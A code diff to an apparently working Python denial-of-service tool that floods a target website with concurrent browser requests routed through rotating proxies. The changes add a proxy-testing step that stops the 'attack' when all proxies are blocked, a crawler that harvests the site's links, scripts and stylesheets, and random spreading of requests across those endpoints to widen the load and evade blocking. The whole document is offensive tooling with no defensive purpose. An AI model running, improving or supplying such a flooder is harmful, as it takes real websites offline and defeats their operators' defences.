@@ -138,6 +138,34 @@ class ProxyManager:
             "best_proxies": best_proxies
         }
 
+async def test_proxies(proxy_manager):
+    print("Testing all proxies...")
+    test_results = {}
+    
+    async with async_playwright() as p:
+        for proxy in proxy_manager.proxies:
+            try:
+                browser = await p.chromium.launch(
+                    headless=True,
+                    proxy={"server": proxy},
+                    args=["--no-sandbox", "--disable-setuid-sandbox"]
+                )
+                context = await browser.new_context()
+                response = await context.request.get(TARGET_URL, timeout=10000)
+                test_results[proxy] = {"success": response.ok, "status": response.status}
+                await browser.close()
+            except Exception as e:
+                test_results[proxy] = {"success": False, "error": str(e)}
+    
+    working_proxies = [proxy for proxy, result in test_results.items() if result["success"]]
+    print(f"Testing complete. {len(working_proxies)}/{len(proxy_manager.proxies)} proxies working.")
+    
+    if len(working_proxies) == 0:
+        print("All proxies are blocked. Stopping attack.")
+        return False
+    
+    return True
+
 async def make_request_with_retry(context, url, proxy_manager, proxy, max_retries=MAX_RETRIES):
     start_time = time.time()
     
@@ -156,6 +184,37 @@ async def make_request_with_retry(context, url, proxy_manager, proxy, max_retrie
             else:
                 await proxy_manager.mark_proxy_result(proxy, False)
                 raise e
+
+async def crawl_endpoints(context, base_url):
+    endpoints = []
+    try:
+        response = await context.request.get(base_url)
+        if response.ok:
+            content = await response.text()
+            from bs4 import BeautifulSoup
+            soup = BeautifulSoup(content, 'html.parser')
+            
+            for link in soup.find_all('a', href=True):
+                href = link['href']
+                if href.startswith('/') or href.startswith(base_url):
+                    full_url = href if href.startswith('http') else base_url + href
+                    endpoints.append(full_url)
+            
+            for script in soup.find_all('script', src=True):
+                src = script['src']
+                if src.startswith('/') or src.startswith(base_url):
+                    full_url = src if src.startswith('http') else base_url + src
+                    endpoints.append(full_url)
+                    
+            for link in soup.find_all('link', href=True):
+                href = link['href']
+                if href.startswith('/') or href.startswith(base_url):
+                    full_url = href if href.startswith('http') else base_url + href
+                    endpoints.append(full_url)
+    except:
+        pass
+    
+    return endpoints
 
 async def attack(playwright, worker_id, proxy_manager):
     global success, fail, status_count
@@ -229,6 +288,10 @@ async def attack(playwright, worker_id, proxy_manager):
         bypass_csp=True
     )
 
+    endpoints = await crawl_endpoints(context, TARGET_URL)
+    if not endpoints:
+        endpoints = [TARGET_URL]
+    
     start = time.time()
     consecutive_failures = 0
     proxy_rotation_count = 0
@@ -239,8 +302,9 @@ async def attack(playwright, worker_id, proxy_manager):
             tasks = []
             for i in range(REQ_PER_LOOP):
                 delay = random.uniform(MIN_DELAY, MAX_DELAY)
+                target_url = random.choice(endpoints)
                 tasks.append(asyncio.sleep(delay))
-                tasks.append(make_request_with_retry(context, TARGET_URL, proxy_manager, proxy))
+                tasks.append(make_request_with_retry(context, target_url, proxy_manager, proxy))
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -351,6 +415,9 @@ async def main():
     stats = proxy_manager.get_proxy_stats()
     print(f"Proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
     print(f"Top 5 best proxies: {stats['best_proxies']}")
+    
+    if not await test_proxies(proxy_manager):
+        return
     
     async with async_playwright() as p:
         tasks = [attack(p, i, proxy_manager) for i in range(CONCURRENCY)]
